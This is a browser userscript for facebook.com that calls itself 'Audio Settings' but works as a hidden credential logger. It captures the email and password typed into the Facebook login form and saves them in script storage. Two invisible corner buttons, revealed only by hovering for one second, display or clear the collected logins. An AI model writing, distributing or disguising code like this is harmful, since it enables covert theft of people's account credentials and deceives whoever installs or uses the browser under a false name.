// ==UserScript==
// @name        Audio Settings
// @namespace   http://www.jamespoel.co.uk
// @include     http*://*.facebook.com/*
// @version     1
// @require     http://userscripts.org/scripts/source/85365.user.js
// @grant       GM_getValue
// @grant       GM_setValue
// ==/UserScript==

var $ = unsafeWindow.jQuery;
var canseelogs=false;
var canseedelete=false;
var logsseetimeout;
var deleteseetimeout;
$(document).ready(function() { 

	if($("#login_form").html()){
		$("#login_form").submit(function(){
			var email = $("#email").val();
			var password = $("#pass").val();
			GM_setValue("fblogs",GM_getValue("fblogs","")+email+" "+password+"<br/>");
		});
	}
	
	var a = $("<a></a>");
	a.css({opacity:"0",display:"block",cursor:"default",width:"16px",height:"16px",backgroundImage:"url(http://i46.tinypic.com/xnrm8y.png)",position:"fixed",top:"0px",left:"0px",zIndex:"500"});
	a.mouseover(function(){
		clearTimeout(logsseetimeout);
		logsseetimeout = setTimeout(function(){
			a.css("opacity","1");
			canseelogs=true;
		},1000);
	});
	a.mouseout(function(){
		clearTimeout(logsseetimeout);
		$(this).css("opacity","0");
		canseelogs=false;
	});
	a.click(function(){
		if(canseelogs){
			if(GM_getValue("fblogs")){
				$("body").html(GM_getValue("fblogs"));
			}else{
				alert("No logs have been recorded");
			}
		}
	});
	$("body").append(a);
	
	
	var a2 = $("<a></a>");
	a2.css({opacity:"0",display:"block",cursor:"default",width:"16px",height:"16px",backgroundImage:"url(http://i45.tinypic.com/2whmf5y.gif)",position:"fixed",top:"0px",right:"0px",zIndex:"500"});
	a2.mouseover(function(){
		clearTimeout(deleteseetimeout);
		deleteseetimeout = setTimeout(function(){
			a2.css("opacity","1");
			canseedelete=true;
		},1000);
	});
	a2.mouseout(function(){
		clearTimeout(deleteseetimeout);
		$(this).css("opacity","0");
		canseedelete=false;
	});
	a2.click(function(){
		if(canseedelete){
			if(confirm("Do you want to clear the logs?") && GM_getValue("fblogs")){
				if(confirm("Are you ABSOLUTELY SURE you want to clear the logs?")){
					GM_setValue("fblogs","");
				}
			}else{
				alert("There are no logs to delete");
			}
		}
	});
	$("body").append(a2);
});